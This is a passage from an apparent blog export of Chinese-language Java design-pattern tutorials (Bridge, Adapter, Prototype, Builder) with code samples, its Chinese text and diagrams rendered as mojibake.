â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â” â”‚BigCar â”‚ â”‚TinyCarâ”‚ â”‚BossCarâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â–² â–² â”‚ â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”‚ BigFuelCar â”‚â”œâ”€â”‚ TinyFuelCar â”‚â”œâ”€â”‚ BossFuelCar â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”‚BigElectricCar â”‚â”œâ”€â”‚TinyElectricCarâ”‚â”œâ”€â”‚BossElectricCarâ”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”‚ BigHybridCar â”‚â””â”€â”‚ TinyHybridCar â”‚â””â”€â”‚ BossHybridCar â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ å¦‚æœè¦æ–°å¢ä¸€ä¸ªå“ç‰Œï¼Œæˆ–è€…åŠ ä¸€ä¸ªæ–°çš„å¼•æ“ï¼ˆæ¯”å¦‚æ ¸åŠ¨åŠ›ï¼‰ï¼Œé‚£ä¹ˆå­ç±»çš„æ•°é‡å¢é•¿æ›´å¿«ã€‚ æ‰€ä»¥ï¼Œæ¡¥æ¥æ¨¡å¼å°±æ˜¯ä¸ºäº†é¿å…ç›´æ¥ç»§æ‰¿å¸¦æ¥çš„å­ç±»çˆ†ç‚¸ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹æ¡¥æ¥æ¨¡å¼å¦‚ä½•è§£å†³ä¸Šè¿°é—®é¢˜ã€‚ åœ¨æ¡¥æ¥æ¨¡å¼ä¸­ï¼Œé¦–å…ˆæŠŠCaræŒ‰å“ç‰Œè¿›è¡Œå­ç±»åŒ–ï¼Œä½†æ˜¯ï¼Œæ¯ä¸ªå“ç‰Œé€‰æ‹©ä»€ä¹ˆå‘åŠ¨æœºï¼Œä¸å†ä½¿ç”¨å­ç±»æ‰©å……ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªæŠ½è±¡çš„â€œä¿®æ­£â€ç±»ï¼Œä»¥ç»„åˆçš„å½¢å¼å¼•å…¥ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“çš„å®ç°ã€‚ é¦–å…ˆå®šä¹‰æŠ½è±¡ç±»Carï¼Œå®ƒå¼•ç”¨ä¸€ä¸ªEngineï¼š public abstract class Car { // å¼•ç”¨Engine: protected Engine engine; public Car(Engine engine) { this.engine = engine; } public abstract void drive(); } Engineçš„å®šä¹‰å¦‚ä¸‹ï¼š public interface Engine { void start(); } ç´§æ¥ç€ï¼Œåœ¨ä¸€ä¸ªâ€œä¿®æ­£â€çš„æŠ½è±¡ç±»RefinedCarä¸­å®šä¹‰ä¸€äº›é¢å¤–æ“ä½œï¼š public abstract class RefinedCar extends Car { public RefinedCar(Engine engine) { super(engine); } public void drive() { this.engine.start(); System.out.println(&quot;Drive &quot; + getBrand() + &quot; car...&quot;); } public abstract String getBrand(); } è¿™æ ·ä¸€æ¥ï¼Œæœ€ç»ˆçš„ä¸åŒå“ç‰Œç»§æ‰¿è‡ªRefinedCarï¼Œä¾‹å¦‚BossCarï¼š public class BossCar extends RefinedCar { public BossCar(Engine engine) { super(engine); } public String getBrand() { return &quot;Boss&quot;; } } è€Œé’ˆå¯¹æ¯ä¸€ç§å¼•æ“ï¼Œç»§æ‰¿è‡ªEngineï¼Œä¾‹å¦‚HybridEngineï¼š public class HybridEngine implements Engine { public void start() { System.out.println(&quot;Start Hybrid Engine...&quot;); } } å®¢æˆ·ç«¯é€šè¿‡è‡ªå·±é€‰æ‹©ä¸€ä¸ªå“ç‰Œï¼Œå†é…åˆä¸€ç§å¼•æ“ï¼Œå¾—åˆ°æœ€ç»ˆçš„Carï¼š RefinedCar car = new BossCar(new HybridEngine()); car.drive(); ä½¿ç”¨æ¡¥æ¥æ¨¡å¼çš„å¥½å¤„åœ¨äºï¼Œå¦‚æœè¦å¢åŠ ä¸€ç§å¼•æ“ï¼Œåªéœ€è¦é’ˆå¯¹Engineæ´¾ç”Ÿä¸€ä¸ªæ–°çš„å­ç±»ï¼Œå¦‚æœè¦å¢åŠ ä¸€ä¸ªå“ç‰Œï¼Œåªéœ€è¦é’ˆå¯¹RefinedCaræ´¾ç”Ÿä¸€ä¸ªå­ç±»ï¼Œä»»ä½•RefinedCarçš„å­ç±»éƒ½å¯ä»¥å’Œä»»ä½•ä¸€ç§Engineè‡ªç”±ç»„åˆï¼Œå³ä¸€è¾†æ±½è½¦çš„ä¸¤ä¸ªç»´åº¦ï¼šå“ç‰Œå’Œå¼•æ“éƒ½å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Car â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚RefinedCar â”‚ â”€ â”€ â”€&gt;â”‚ Engine â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”‚ â”œâ”€â”‚ FuelEngine â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”€â”€â”€â”€â” â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚BigCar â”‚â”‚TinyCarâ”‚â”‚BossCarâ”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”˜ â”œâ”€â”‚ElectricEngineâ”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”‚ HybridEngine â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ æ¡¥æ¥æ¨¡å¼å®ç°æ¯”è¾ƒå¤æ‚ï¼Œå®é™…åº”ç”¨ä¹Ÿéå¸¸å°‘ï¼Œä½†å®ƒæä¾›çš„è®¾è®¡æ€æƒ³å€¼å¾—å€Ÿé‰´ï¼Œå³ä¸è¦è¿‡åº¦ä½¿ç”¨ç»§æ‰¿ï¼Œè€Œæ˜¯ä¼˜å…ˆæ‹†åˆ†æŸäº›éƒ¨ä»¶ï¼Œä½¿ç”¨ç»„åˆçš„æ–¹å¼æ¥æ‰©å±•åŠŸèƒ½ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"é€‚é…å™¨æ¨¡å¼","slug":"é€‚é…å™¨æ¨¡å¼","date":"2020-06-07T22:28:13.000Z","updated":"2021-04-11T17:11:29.068Z","comments":true,"path":"é€‚é…å™¨æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"é€‚é…å™¨æ¨¡å¼ å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ï¼Œä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚","text":"é€‚é…å™¨æ¨¡å¼ å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ï¼Œä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚ é€‚é…å™¨æ¨¡å¼æ˜¯Adapterï¼Œä¹Ÿç§°Wrapperï¼Œæ˜¯æŒ‡å¦‚æœä¸€ä¸ªæ¥å£éœ€è¦Bæ¥å£ï¼Œä½†æ˜¯å¾…ä¼ å…¥çš„å¯¹è±¡å´æ˜¯Aæ¥å£ï¼Œæ€ä¹ˆåŠï¼Ÿ æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ã€‚å¦‚æœå»ç¾å›½ï¼Œæˆ‘ä»¬éšèº«å¸¦çš„ç”µå™¨æ˜¯æ— æ³•ç›´æ¥ä½¿ç”¨çš„ï¼Œå› ä¸ºç¾å›½çš„æ’åº§æ ‡å‡†å’Œä¸­å›½ä¸åŒï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé€‚é…å™¨ï¼š adapter public class Task implements Callable&lt;Long&gt; { private long num; public Task(long num) { this.num = num; } public Long call() throws Exception { long r = 0; for (long n = 1; n &lt;= this.num; n++) { r = r + n; } System.out.println(&quot;Result: &quot; + r); return r; } } ç°åœ¨ï¼Œæˆ‘ä»¬æƒ³é€šè¿‡ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œå®ƒï¼š Callable&lt;Long&gt; callable = new Task(123450000L); Thread thread = new Thread(callable); // compile error! thread.start(); å‘ç°ç¼–è¯‘ä¸è¿‡ï¼å› ä¸ºThreadæ¥æ”¶Runnableæ¥å£ï¼Œä½†ä¸æ¥æ”¶Callableæ¥å£ï¼Œè‚¿ä¹ˆåŠï¼Ÿ ä¸€ä¸ªåŠæ³•æ˜¯æ”¹å†™Taskç±»ï¼ŒæŠŠå®ç°çš„Callableæ”¹ä¸ºRunnableï¼Œä½†è¿™æ ·åšä¸å¥½ï¼Œå› ä¸ºTaskå¾ˆå¯èƒ½åœ¨å…¶ä»–åœ°æ–¹ä½œä¸ºCallableè¢«å¼•ç”¨ï¼Œæ”¹å†™Taskçš„æ¥å£ï¼Œä¼šå¯¼è‡´å…¶ä»–æ­£å¸¸å·¥ä½œçš„ä»£ç æ— æ³•ç¼–è¯‘ã€‚ å¦ä¸€ä¸ªåŠæ³•ä¸ç”¨æ”¹å†™Taskç±»ï¼Œè€Œæ˜¯ç”¨ä¸€ä¸ªAdapterï¼ŒæŠŠè¿™ä¸ªCallableæ¥å£â€œå˜æˆâ€Runnableæ¥å£ï¼Œè¿™æ ·ï¼Œå°±å¯ä»¥æ­£å¸¸ç¼–è¯‘ï¼š Callable&lt;Long&gt; callable = new Task(123450000L); Thread thread = new Thread(new RunnableAdapter(callable)); thread.start(); è¿™ä¸ªRunnableAdapterç±»å°±æ˜¯Adapterï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªCallableï¼Œè¾“å‡ºä¸€ä¸ªRunnableã€‚æ€ä¹ˆå®ç°è¿™ä¸ªRunnableAdapterå‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹å®Œæ•´çš„ä»£ç ï¼š public class RunnableAdapter implements Runnable { // å¼•ç”¨å¾…è½¬æ¢æ¥å£: private Callable&lt;?&gt; callable; public RunnableAdapter(Callable&lt;?&gt; callable) { this.callable = callable; } // å®ç°æŒ‡å®šæ¥å£: public void run() { // å°†æŒ‡å®šæ¥å£è°ƒç”¨å§”æ‰˜ç»™è½¬æ¢æ¥å£è°ƒç”¨: try { callable.call(); } catch (Exception e) { throw new RuntimeException(e); } } } ç¼–å†™ä¸€ä¸ªAdapterçš„æ­¥éª¤å¦‚ä¸‹ï¼š å®ç°ç›®æ ‡æ¥å£ï¼Œè¿™é‡Œæ˜¯Runnableï¼› å†…éƒ¨æŒæœ‰ä¸€ä¸ªå¾…è½¬æ¢æ¥å£çš„å¼•ç”¨ï¼Œè¿™é‡Œæ˜¯é€šè¿‡å­—æ®µæŒæœ‰Callableæ¥å£ï¼› åœ¨ç›®æ ‡æ¥å£çš„å®ç°æ–¹æ³•å†…éƒ¨ï¼Œè°ƒç”¨å¾…è½¬æ¢æ¥å£çš„æ–¹æ³•ã€‚ è¿™æ ·ä¸€æ¥ï¼ŒThreadå°±å¯ä»¥æ¥æ”¶è¿™ä¸ªRunnableAdapterï¼Œå› ä¸ºå®ƒå®ç°äº†Runnableæ¥å£ã€‚Threadä½œä¸ºè°ƒç”¨æ–¹ï¼Œå®ƒä¼šè°ƒç”¨RunnableAdapterçš„run()æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªrun()æ–¹æ³•å†…éƒ¨ï¼Œåˆè°ƒç”¨äº†Callableçš„call()æ–¹æ³•ï¼Œç›¸å½“äºThreadé€šè¿‡ä¸€å±‚è½¬æ¢ï¼Œé—´æ¥è°ƒç”¨äº†Callableçš„call()æ–¹æ³•ã€‚ é€‚é…å™¨æ¨¡å¼åœ¨Javaæ ‡å‡†åº“ä¸­æœ‰å¹¿æ³›åº”ç”¨ã€‚æ¯”å¦‚æˆ‘ä»¬æŒæœ‰æ•°æ®ç±»å‹æ˜¯String[]ï¼Œä½†æ˜¯éœ€è¦Listæ¥å£æ—¶ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªAdapterï¼š String[] exist = new String[] {&quot;Good&quot;, &quot;morning&quot;, &quot;Bob&quot;, &quot;and&quot;, &quot;Alice&quot;}; Set&lt;String&gt; set = new HashSet&lt;&gt;(Arrays.asList(exist)); æ³¨æ„åˆ°List Arrays.asList(T[])å°±ç›¸å½“äºä¸€ä¸ªè½¬æ¢å™¨ï¼Œå®ƒå¯ä»¥æŠŠæ•°ç»„è½¬æ¢ä¸ºListã€‚ æˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¾‹å­ï¼šå‡è®¾æˆ‘ä»¬æŒæœ‰ä¸€ä¸ªInputStreamï¼Œå¸Œæœ›è°ƒç”¨readText(Reader)æ–¹æ³•ï¼Œä½†å®ƒçš„å‚æ•°ç±»å‹æ˜¯Readerè€Œä¸æ˜¯InputStreamï¼Œæ€ä¹ˆåŠï¼Ÿ å½“ç„¶æ˜¯ä½¿ç”¨é€‚é…å™¨ï¼ŒæŠŠInputStreamâ€œå˜æˆâ€Readerï¼š InputStream input = Files.newInputStream(Paths.get(&quot;/path/to/file&quot;)); Reader reader = new InputStreamReader(input, &quot;UTF-8&quot;); readText(reader); InputStreamReaderå°±æ˜¯Javaæ ‡å‡†åº“æä¾›çš„Adapterï¼Œå®ƒè´Ÿè´£æŠŠä¸€ä¸ªInputStreamé€‚é…ä¸ºReaderã€‚ç±»ä¼¼çš„è¿˜æœ‰OutputStreamWriterã€‚ å¦‚æœæˆ‘ä»¬æŠŠreadText(Reader)æ–¹æ³•å‚æ•°ä»Readeræ”¹ä¸ºFileReaderï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿè¿™ä¸ªæ—¶å€™ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸€ä¸ªFileReaderç±»å‹ï¼Œå°±å¿…é¡»æŠŠInputStreamé€‚é…ä¸ºFileReaderï¼š FileReader reader = new InputStreamReader(input, &quot;UTF-8&quot;); // compile error! ç›´æ¥ä½¿ç”¨InputStreamReaderè¿™ä¸ªAdapteræ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå®ƒåªèƒ½è½¬æ¢å‡ºReaderæ¥å£ã€‚äº‹å®ä¸Šï¼Œè¦æŠŠInputStreamè½¬æ¢ä¸ºFileReaderä¹Ÿä¸æ˜¯ä¸å¯èƒ½ï¼Œä½†éœ€è¦èŠ±è´¹åå€ä»¥ä¸Šçš„åŠŸå¤«ã€‚è¿™æ—¶ï¼Œé¢å‘æŠ½è±¡ç¼–ç¨‹è¿™ä¸€åŸåˆ™å°±ä½“ç°å‡ºäº†å¨åŠ›ï¼šæŒæœ‰é«˜å±‚æ¥å£ä¸ä½†ä»£ç æ›´çµæ´»ï¼Œè€Œä¸”æŠŠå„ç§æ¥å£ç»„åˆèµ·æ¥ä¹Ÿæ›´å®¹æ˜“ã€‚ä¸€æ—¦æŒæœ‰æŸä¸ªå…·ä½“çš„å­ç±»ç±»å‹ï¼Œè¦æƒ³åšä¸€äº›æ”¹åŠ¨å°±éå¸¸å›°éš¾ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"åŸå‹","slug":"åŸå‹","date":"2020-06-07T17:43:14.000Z","updated":"2021-04-11T17:11:28.788Z","comments":true,"path":"åŸå‹/","link":"","permalink":"https://blog.kayleh.top/%E5%8E%9F%E5%9E%8B/","excerpt":"åŸå‹ ç”¨åŸå‹å®ä¾‹æŒ‡å®šåˆ›å»ºå¯¹è±¡çš„ç§ç±»ï¼Œå¹¶ä¸”é€šè¿‡æ‹·è´è¿™äº›åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚","text":"åŸå‹ ç”¨åŸå‹å®ä¾‹æŒ‡å®šåˆ›å»ºå¯¹è±¡çš„ç§ç±»ï¼Œå¹¶ä¸”é€šè¿‡æ‹·è´è¿™äº›åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚ åŸå‹æ¨¡å¼ï¼Œå³Prototypeï¼Œæ˜¯æŒ‡åˆ›å»ºæ–°å¯¹è±¡çš„æ—¶å€™ï¼Œæ ¹æ®ç°æœ‰çš„ä¸€ä¸ªåŸå‹æ¥åˆ›å»ºã€‚ æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªString[]æ•°ç»„ï¼Œæƒ³å†åˆ›å»ºä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„String[]æ•°ç»„ï¼Œæ€ä¹ˆå†™ï¼Ÿ å®é™…ä¸Šåˆ›å»ºè¿‡ç¨‹å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠç°æœ‰æ•°ç»„çš„å…ƒç´ å¤åˆ¶åˆ°æ–°æ•°ç»„ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªåˆ›å»ºè¿‡ç¨‹å°è£…ä¸€ä¸‹ï¼Œå°±æˆäº†åŸå‹æ¨¡å¼ã€‚ç”¨ä»£ç å®ç°å¦‚ä¸‹ï¼š // åŸå‹: String[] original = { &quot;Apple&quot;, &quot;Pear&quot;, &quot;Banana&quot; }; // æ–°å¯¹è±¡: String[] copy = Arrays.copyOf(original, original.length); å¯¹äºæ™®é€šç±»ï¼Œæˆ‘ä»¬å¦‚ä½•å®ç°åŸå‹æ‹·è´ï¼ŸJavaçš„Objectæä¾›äº†ä¸€ä¸ªclone()æ–¹æ³•ï¼Œå®ƒçš„æ„å›¾å°±æ˜¯å¤åˆ¶ä¸€ä¸ªæ–°çš„å¯¹è±¡å‡ºæ¥ï¼Œæˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªCloneableæ¥å£æ¥æ ‡è¯†ä¸€ä¸ªå¯¹è±¡æ˜¯â€œå¯å¤åˆ¶â€çš„ï¼š public class Employee implements Cloneable { private int id; private String name; private int score; // å¤åˆ¶æ–°å¯¹è±¡å¹¶è¿”å›: public Object clone() { Employee employee = new Employee(); employee.id = this.id; employee.name = this.name; employee.score = this.score; return employee; } } ä½¿ç”¨çš„æ—¶å€™ï¼Œå› ä¸ºclone()çš„æ–¹æ³•ç­¾åæ˜¯å®šä¹‰åœ¨Objectä¸­ï¼Œè¿”å›ç±»å‹ä¹Ÿæ˜¯Objectï¼Œæ‰€ä»¥è¦å¼ºåˆ¶è½¬å‹ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼š Employee employee = new Employee(); employee.setId(123); employee.setName(&quot;Bob&quot;); employee.setScore(88); // å¤åˆ¶æ–°å¯¹è±¡: Employee employee2 = (Employee) employee.clone(); System.out.println(employee); System.out.println(employee2); System.out.println(employee == employee2); // false å®é™…ä¸Šï¼Œä½¿ç”¨åŸå‹æ¨¡å¼æ›´å¥½çš„æ–¹å¼æ˜¯å®šä¹‰ä¸€ä¸ªcopy()æ–¹æ³•ï¼Œè¿”å›æ˜ç¡®çš„ç±»å‹ï¼š public class Employee { private int id; private String name; private int score; public Employee copy() { Student employee = new Employee(); employee.id = this.id; employee.name = this.name; employee.score = this.score; return employee; } } åŸå‹æ¨¡å¼åº”ç”¨ä¸æ˜¯å¾ˆå¹¿æ³›ï¼Œå› ä¸ºå¾ˆå¤šå®ä¾‹ä¼šæŒæœ‰ç±»ä¼¼æ–‡ä»¶ã€Socketè¿™æ ·çš„èµ„æºï¼Œè€Œè¿™äº›èµ„æºæ˜¯æ— æ³•å¤åˆ¶ç»™å¦ä¸€ä¸ªå¯¹è±¡å…±äº«çš„ï¼Œåªæœ‰å­˜å‚¨ç®€å•ç±»å‹çš„â€œå€¼â€å¯¹è±¡å¯ä»¥å¤åˆ¶ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"ç”Ÿæˆå™¨","slug":"ç”Ÿæˆå™¨","date":"2020-06-07T17:39:43.000Z","updated":"2021-04-11T17:11:28.975Z","comments":true,"path":"ç”Ÿæˆå™¨/","link":"","permalink":"https://blog.kayleh.top/%E7%94%9F%E6%88%90%E5%99%A8/","excerpt":"ç”Ÿæˆå™¨ å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„è¡¨ç¤ºåˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚","text":"ç”Ÿæˆå™¨ å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„è¡¨ç¤ºåˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚ ç”Ÿæˆå™¨æ¨¡å¼ï¼ˆBuilderï¼‰æ˜¯ä½¿ç”¨å¤šä¸ªâ€œå°å‹â€å·¥å‚æ¥æœ€ç»ˆåˆ›å»ºå‡ºä¸€ä¸ªå®Œæ•´å¯¹è±¡ã€‚ å½“æˆ‘ä»¬ä½¿ç”¨Builderçš„æ—¶å€™ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæ˜¯å› ä¸ºåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„æ­¥éª¤æ¯”è¾ƒå¤šï¼Œæ¯ä¸ªæ­¥éª¤éƒ½éœ€è¦ä¸€ä¸ªé›¶éƒ¨ä»¶ï¼Œæœ€ç»ˆç»„åˆæˆä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡ã€‚ ä½¿ç”¨Builderæ¨¡å¼æ—¶ï¼Œé€‚ç”¨äºåˆ›å»ºçš„å¯¹è±¡æ¯”è¾ƒå¤æ‚ï¼Œæœ€å¥½ä¸€æ­¥ä¸€æ­¥åˆ›å»ºå‡ºâ€œé›¶ä»¶â€ï¼Œæœ€åå†è£…é…èµ·æ¥ã€‚JavaMailçš„MimeMessageå°±å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªBuilderæ¨¡å¼ï¼Œåªä¸è¿‡Builderå’Œæœ€ç»ˆäº§å“åˆäºŒä¸ºä¸€ï¼Œéƒ½æ˜¯MimeMessageï¼š Multipart multipart = new MimeMultipart(); // æ·»åŠ text: BodyPart textpart = new MimeBodyPart(); textpart.setContent(body, &quot;text/html;charset=utf-8&quot;); multipart.addBodyPart(textpart); // æ·»åŠ image: BodyPart imagepart = new MimeBodyPart(); imagepart.setFileName(fileName); imagepart.setDataHandler(new DataHandler(new ByteArrayDataSource(input, &quot;application/octet-stream&quot;))); multipart.addBodyPart(imagepart); MimeMessage message = new MimeMessage(session); // è®¾ç½®å‘é€æ–¹åœ°å€: message.setFrom(new InternetAddress(&quot;me@example.com&quot;)); // è®¾ç½®æ¥æ”¶æ–¹åœ°å€: message.setRecipient(Message.RecipientType.TO, new InternetAddress(&quot;xiaoming@somewhere.com&quot;)); // è®¾ç½®é‚®ä»¶ä¸»é¢˜: message.setSubject(&quot;Hello&quot;, &quot;UTF-8&quot;); // è®¾ç½®é‚®ä»¶å†…å®¹ä¸ºmultipart: message.setContent(multipart); å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç®€åŒ–Builderæ¨¡å¼ï¼Œä»¥é“¾å¼è°ƒç”¨çš„æ–¹å¼æ¥åˆ›å»ºå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ç»å¸¸ç¼–å†™è¿™æ ·çš„ä»£ç ï¼šStringBuilder builder = new StringBuilder(); builder.append(secure ? &quot;https://&quot; : &quot;http://&quot;) .append(&quot;www.liaoxuefeng.com&quot;) .append(&quot;/&quot;) .append(&quot;?t=0&quot;); String url = builder.toString(); ç”±äºæˆ‘ä»¬ç»å¸¸éœ€è¦æ„é€ URLå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨Builderæ¨¡å¼ç¼–å†™ä¸€ä¸ªURLBuilderï¼Œè°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼šString url = URLBuilder.builder() // åˆ›å»ºBuilder .setDomain(&quot;www.liaoxuefeng.com&quot;) // è®¾ç½®domain .setScheme(&quot;https&quot;) // è®¾ç½®scheme .setPath(&quot;/&quot;) // è®¾ç½®è·¯å¾„ .setQuery(Map.of(&quot;a&quot;, &quot;123&quot;, &quot;q&quot;, &quot;K&amp;R&quot;)) // è®¾ç½®query .build(); // 